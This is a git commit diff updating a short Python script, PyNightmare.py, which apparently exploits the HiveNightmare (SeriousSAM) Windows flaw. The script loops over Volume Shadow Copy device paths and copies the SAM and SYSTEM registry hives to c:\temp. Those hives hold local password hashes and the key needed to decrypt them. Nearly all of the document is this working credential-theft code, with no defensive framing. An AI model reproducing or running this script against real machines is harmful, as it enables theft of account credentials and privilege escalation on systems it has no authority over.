8ae85ec9aebb6ed6b35688ec40bd428c9693f1fa
Sp00p64 <59793368+Sp00p64@users.noreply.github.com>
2021-07-25 03:03:01 +0200

    Update PyNightmare.py

--- PyNightmare.py
+++ PyNightmare.py
@@ -1,22 +1,25 @@
 import shutil
 import os
+import subprocess
 
 def make_copy(config_file):
-    file = f"c:\\temp\\{config_file}.copy"
+    n=0
     print(f"[*] Trying to dump {config_file}...")
     for i in range(16):
         try:
             backup_location = f'\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{i}\\Windows\\System32\\config\\{config_file}'
+            file = f"c:\\temp\\{config_file}{i}.copy"
             shutil.copy(backup_location, file)
             print(f"[*] Backup located at {backup_location}")
             print(f"[*] Successfully copied {config_file} to {file}")
-            return file
+            n+=1
         except:
             pass
-    print(f"[!] Dump of {config_file} failed, ")
+    if n < 1:
+        print(f"[!] Dump of {config_file} failed, ")
 
 def main():
-    make_copy("system")
-    make_copy("sam")
+    make_copy("SYSTEM")
+    make_copy("SAM")
 if __name__ == '__main__':
     main()
